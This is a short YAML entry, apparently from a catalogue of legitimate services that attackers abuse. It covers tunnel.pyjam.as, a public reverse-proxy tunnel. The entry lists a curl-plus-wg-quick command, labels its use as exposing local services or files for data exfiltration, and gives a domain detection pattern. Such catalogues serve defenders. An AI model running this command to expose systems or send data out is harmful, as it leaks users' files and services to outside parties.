---
Name: Pyjam.as
Description: tunnel.pyjam.as can be used as an ephemeral reverse proxy for your local services. This may be useful, for instance when you need to show your friend something cool you've built.
Author: Phill Moore
Created: 2025-04-22
Commands:
  - Command: curl https://tunnel.pyjam.as/<PORT> > <CONFIG> && wg-quick up ./<CONFIG>
    Description: Create tunnel through public service
    Usecase: Exposing local services/file system over the internet for data exfiltration.
    Category: Exfiltrate
    Privileges: User
    OperatingSystem: Windows, Linux, MacOS
Custom_Domain_Supported: True
Full_Path:
  - Path: Execution via command line using native tools
Detection:
  - Domain: '*tunnel.pyjam.as*'
Resources:
  - Link: https://gitlab.com/pyjam.as/tunnel
Acknowledgement:
  - Person: Phill Moore
    Handle: '@randomaccess3'
---